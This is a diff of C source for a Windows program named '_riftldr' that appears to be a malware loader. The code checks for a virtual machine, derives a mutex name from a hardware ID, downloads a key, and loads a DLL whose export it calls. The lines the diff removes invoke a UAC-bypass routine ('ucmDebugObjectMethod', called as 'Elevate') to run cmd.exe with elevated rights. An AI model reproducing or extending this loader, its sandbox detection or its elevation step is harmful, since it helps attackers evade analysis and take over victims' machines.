@@ -1,9 +1,12 @@
 #include "_riftldr.h"
 
-typedef BOOL(*pEDllInit)(_In_ PPIB);
-typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ PWSTR pszPayload);
+typedef STATUS(WINAPI* DllMain)(
+	_In_ HINSTANCE hinstDLL,
+	_In_ DWORD fdwReason,
+	_In_ PVOID pvReserved
+);
 
-INT WINAPI wWinMain(
+STATUS WINAPI wWinMain(
 	_In_     HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
 	_In_     PWSTR     pCmdLine,
@@ -20,17 +23,14 @@ INT WINAPI wWinMain(
 		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, &g_PIB->sArg.n); // bugy (sometimes causes an excepion)
 	}
 
-	PCSTR testid = EUuidEncodeA(&g_PIB->sID.HW);
-	UUID test;
-	EUuidDecodeA(testid, &test);
 
 	if (g_PIB->sArg.n > 0) {
 		if (!lstrcmpW(g_PIB->sArg.v[0], L"/i")) { // Start Installation
 
-		} else if (!lstrcmpW(g_PIB->sArg.v[0], L"/s")) { // Start
+		} else if (!lstrcmpW(g_PIB->sArg.v[0], L"/s")) { // Start Servicemode
 
 		}
-	} else {
+	} else { // Userstart
 
 	}
 
@@ -40,18 +40,26 @@ INT WINAPI wWinMain(
 	PWSTR szMutex = AllocMemory(MAX_PATH * sizeof(WCHAR));
 	StringCchCopyW(szMutex, MAX_PATH, szLocal);
 	FreeMemory(szLocal);
-	PVOID pHWID = AllocMemory(MD5_SIZE);
-	CopyMemory(pHWID, &g_PIB->sID.SE, MD5_SIZE);
+	PVOID pHWID = AllocMemory(sizeof(MD5));
+	CopyMemory(pHWID, &g_PIB->sID.SE, sizeof(MD5));
 	PCWSTR szRandom = EAllocRandomBase64StringW(pHWID, MAX_PATH / 2, MAX_PATH - 7);
 	FreeMemory(pHWID);
 	StringCchCatW(szMutex, MAX_PATH, szRandom);
 	FreeMemory(szRandom);
-
 	// CreateMutexW(0, FALSE, szMutex);
 
 	// init con
 	IOpenConsole();
 	BOOL bVM = ICheckVmPresent();
+	{
+		DWORD dwS = InternetAttemptConnect(NULL);
+		if (dwS) {
+			EPrintFW(L"Couldn't connect to Internet-Services.\nSoftware blocks further execution!\n", CON_WARNING);
+			dwS = ReadConsoleW(GetStdHandle(STD_INPUT_HANDLE), NULL, 0, NULL, NULL);
+			dwS = GetLastError();
+			return -1;
+		}
+	}
 
 	PVOID pWKey = IDownloadKey();
 	if (!pWKey) {
@@ -76,12 +84,8 @@ INT WINAPI wWinMain(
 	if (!dhDll)
 		return 0x2ab5;
 
-	pEDllInit EDllInit = (pEDllInit)GetProcAddress(dhDll, "EDllInit");
-	BOOL bTest = EDllInit(g_PIB);
-
-	ucmDebugObjectMethod Elevate = (ucmDebugObjectMethod)GetProcAddress(dhDll, "ucmDebugObjectMethod");
-	WCHAR payload[] = L"C:\\WINDOWS\\system32\\cmd.exe";
-	Elevate(payload);
+	DllMain rift = (DllMain)GetProcAddress(dhDll, "DllMain");
+	STATUS bTest = rift(NULL, 4, g_PIB);
 
 	FreeLibrary(dhDll);
 #endif
